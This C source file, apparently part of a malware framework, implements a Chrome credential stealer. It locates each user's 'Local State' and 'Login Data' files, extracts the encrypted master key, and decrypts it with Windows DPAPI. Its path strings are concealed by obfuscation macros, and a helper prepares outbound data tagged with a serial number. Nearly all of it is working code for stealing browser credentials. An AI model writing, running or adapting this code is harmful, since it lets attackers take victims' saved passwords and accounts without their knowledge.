#include "chrome_stealer.h"

// Helper function to decode
LPBYTE base64Decode(LPCSTR base64, LPDWORD outSize) {
    if (base64 == NULL || outSize == NULL) {
        debug_printf("No input for base64Decode.\n");
        return NULL;
    }
    *outSize = 0;
    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, NULL, outSize, NULL, NULL)) {
        debug_printf("base64Decode error\n");
        debug_printf("error code:%lu\n", GetLastError());
        return NULL;
    }
    LPBYTE buffer = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, *outSize);
    if (NULL == buffer) {
        debug_printf("Memory allocation failed.\n");
        debug_printf("error code:%lu\n", GetLastError());
        return NULL;
    }
    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, buffer, outSize, NULL, NULL)) {
        debug_printf("base64Decode error\n");
        debug_printf("error code:%lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, buffer);
        return NULL;
    }
    return buffer;
}

// helper function to encode
LPSTR base64Encode(LPBYTE inputBuffer, DWORD bufferLength) {
    if (bufferLength == 0 || inputBuffer == NULL) {
        return NULL;
    }
    // Calculate the length of the Base64 encoded string
    DWORD encodedSize = 0;
    if (!CryptBinaryToStringA(
            inputBuffer,
            bufferLength,
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            NULL,
            &encodedSize)
        ) {
        debug_printf("Failed to calculate Base64 encoded size.\n");
        debug_printf("error code:%lu\n", GetLastError());
        return NULL;
    }
    // Allocate memory for the Base64 encoded string
    LPSTR encodedString = (LPSTR) HeapAlloc(GetProcessHeap(), 0, encodedSize);
    if (NULL == encodedString) {
        debug_printf("Memory allocation for Base64 encoded string failed.\n");
        return NULL;
    }
    // Perform the Base64 encoding
    if (!CryptBinaryToStringA(
            inputBuffer,
            bufferLength,
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            encodedString,
            &encodedSize)
        ) {
        debug_printf("Base64 encoding failed.\n");
        debug_printf("error code:%lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, encodedString);
        return NULL;
    }
    // this string is null terminated
    return encodedString;
}

// Function to get the username and return it as a dynamically allocated string.
LPSTR getUsername() {
    // Allocate a buffer of UNLEN + 1 characters to ensure null ternimated
    DWORD bufferSize = UNLEN + 1;
    LPSTR buffer =
    (LPSTR) HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        bufferSize * sizeof(char));
    if (NULL == buffer) {
        debug_printf("Memory allocation failed\n");
        debug_printf("error code:%lu\n", GetLastError());
        return NULL;
    }
    if (!GetUserNameA(buffer, &bufferSize)) {
        debug_printf("GetUserNameA failed.\n");
        debug_printf("error code:%lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, buffer);
        return NULL;
    }
    // If successful, buffer now contains the username as a null-terminated string.
    return buffer;
}

// Concatenate all the outbound string with the serial number
LPSTR concatSerial(LPCSTR serial_number, LPCSTR flag, LPCSTR data) {
    // Calculate the length of the final string
    // +1 for the null terminator
    size_t totalLength = strlen(serial_number) + strlen(flag) +strlen(data) + 1;
    // Allocate memory for the new string
    LPSTR result = 
    (LPSTR)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        totalLength * sizeof(char)
    );
    if (NULL == result) {
        return NULL;
    }
    // Construct the new string
    sprintf_s(result, totalLength, "%s%s%s", serial_number, flag, data);

    return result;
}

// helper function to generate absolute path for chrome file
LPSTR concatePath(LPCSTR userPathPrefix, LPCSTR userName, LPCSTR basePath) {
    // +1 for the null-terminator.
    size_t totalLength = strlen(userPathPrefix) + strlen(userName) + strlen(basePath) + 1;
    LPSTR fullPath = 
    (LPSTR)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        totalLength * sizeof(char)
    );
    if (NULL == fullPath) {
        debug_printf("Memory allocation failed\n");
        debug_printf("error code:%lu\n", GetLastError());
        return NULL;
    }
    // Construct the full path.
    sprintf_s(fullPath, totalLength, "%s%s%s", userPathPrefix, userName, basePath);

    return fullPath;
}

// take speicifed username to generate a path to target file "local state"
// if null, use current username
LPSTR getChromeLocalStatePath(LPSTR username) {
    LPSTR username_default = NULL;
    if (NULL == username) {
        username_default = getUsername();
        if (NULL == username_default) {
            return NULL;
        }
    } else {
        username_default = username;
    }
    // Assuming "C:\Users\" as the static part before the username.
    LAIKA_BOX_STARTVAR(char*, rootpath, KEY_chromstealer_getChromeLocalStatePath_users, DATA_chromstealer_getChromeLocalStatePath_users)
    LAIKA_BOX_STARTVAR(char*, localstate, KEY_chromstealer_getChromeLocalStatePath_localstate, DATA_chromstealer_getChromeLocalStatePath_localstate)
    char *fullPath = concatePath(
        rootpath,
        username_default,
        localstate);
    LAIKA_BOX_ENDVAR(rootpath) 
    LAIKA_BOX_ENDVAR(localstate) 

    if (NULL == username) {
        HeapFree(GetProcessHeap(), 0, username_default);
    }

    return fullPath;
}

// take speicifed username to generate a path to target file "login data"
// if null, use current username
LPSTR getChromeLocalLoginPath(LPSTR username) {
    LPSTR username_default = NULL;
    if (NULL == username) {
        username_default = getUsername();
        if (NULL == username_default) {
            return NULL;
        }
    } else {
        username_default = username;
    }
    // Define the static part of the path.
    LAIKA_BOX_STARTVAR(char*, rootpath, KEY_chromstealer_getChromeLocalLoginPath_users, DATA_chromstealer_getChromeLocalLoginPath_users)
    LAIKA_BOX_STARTVAR(char*, logindata, KEY_chromstealer_getChromeLocalLoginPath_logindata, DATA_chromstealer_getChromeLocalLoginPath_logindata)
    char *fullPath = concatePath(
        rootpath,
        username_default,
        logindata
    );
    LAIKA_BOX_ENDVAR(rootpath)
    LAIKA_BOX_ENDVAR(logindata)

    if (NULL == username) {
        HeapFree(GetProcessHeap(), 0, username_default);
    }

    return fullPath;
}

// Reads the encrypted key from the file at the given path.
// Returns a dynamically allocated buffer with the key, or NULL on failure.
LPSTR readEncryptedKey(LPCSTR filePath) {
    // Open the file for reading.
    file_t target_file;
    if (!mapFile(filePath, &target_file)) {
        return NULL;
    }

    LAIKA_BOX_STARTVAR(char*, encrypted_key, KEY_chromstealer_readEncryptedKey_searchStr, DATA_chromstealer_readEncryptedKey_searchStr)
    const LPSTR searchStr = encrypted_key;
    debug_printf(searchStr);

    LPSTR pos = strstr((LPSTR) target_file.lpBuffer, searchStr);

    // not found
    if (NULL == pos) {
        unMapFile(&target_file);
        return NULL;
    }
    // found, calculate encrypted key size
    // +1 for null terminated
    pos = pos + strlen(searchStr) + 3;
    LAIKA_BOX_ENDVAR(encrypted_key)
    LPSTR pos_end = pos;
    while (*pos_end != '"') {
        pos_end++;
    }
    char *keyBuffer = 
    (LPSTR) HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        pos_end - pos + 1
    );
    if (NULL == keyBuffer) {
        unMapFile(&target_file);
        return NULL;
    }
    // copy key
    strncpy(keyBuffer, pos, pos_end - pos);
    unMapFile(&target_file);

    return keyBuffer;
}

// Decrypts the secret key starting from its 6th character.
// returns a base64 encoded decrypted string
LPSTR decryptSecretKey(LPCSTR encryptedDataB64) {
    DWORD encryptedDataSize = 0;
    LPBYTE rawSecretKey = base64Decode(encryptedDataB64, &encryptedDataSize);
    if (NULL == rawSecretKey) {
        return NULL;
    }
    // Skip the first 5 characters of the decoded secret key.
    LPBYTE encryptedData = rawSecretKey + 5;
    DATA_BLOB inputData;
    DATA_BLOB outputData;
    inputData.pbData = encryptedData;
    inputData.cbData = encryptedDataSize;
    // decrypt the data.
    if (!CryptUnprotectData(&inputData, NULL, NULL, NULL, NULL, 0, &outputData)) {
        debug_printf("Decryption failed in DecryptSecretKey.\n");
        debug_printf("error code:%lu\n", GetLastError());
        HeapFree(GetProcessHeap(),0, rawSecretKey);
        return NULL;
    }
    // encode back the decrypted key to base64
    // file_t input_buffer;
    // input_buffer.lpBuffer = (LPBYTE)outputData.pbData;
    // input_buffer.fileSize.LowPart = outputData.cbData;

    LPSTR encodedDecryptedString = base64Encode(outputData.pbData, outputData.cbData);    
    // Free the original encrypted data and the output blob's data.
    HeapFree(GetProcessHeap(),0, rawSecretKey);
    LocalFree(outputData.pbData);

    return encodedDecryptedString;
}

// Get chrome decryption key (Base64 encoded)
// if username is null, use current username
LPSTR getChromeDecryptionKey(LPSTR username) {
    LPSTR local_state_file_path = getChromeLocalStatePath(username);
    LPSTR encryptedKey = readEncryptedKey(local_state_file_path);
    LPSTR decrypteSecretKey = decryptSecretKey(encryptedKey);
    // HeapFree can take null pointer
    HeapFree(GetProcessHeap(), 0, local_state_file_path);
    HeapFree(GetProcessHeap(), 0, encryptedKey);
    // Debug:
    debug_printf("length: %lld\n", strlen(decrypteSecretKey));
    debug_printf("key: %s\n", decrypteSecretKey);

    return decrypteSecretKey;
}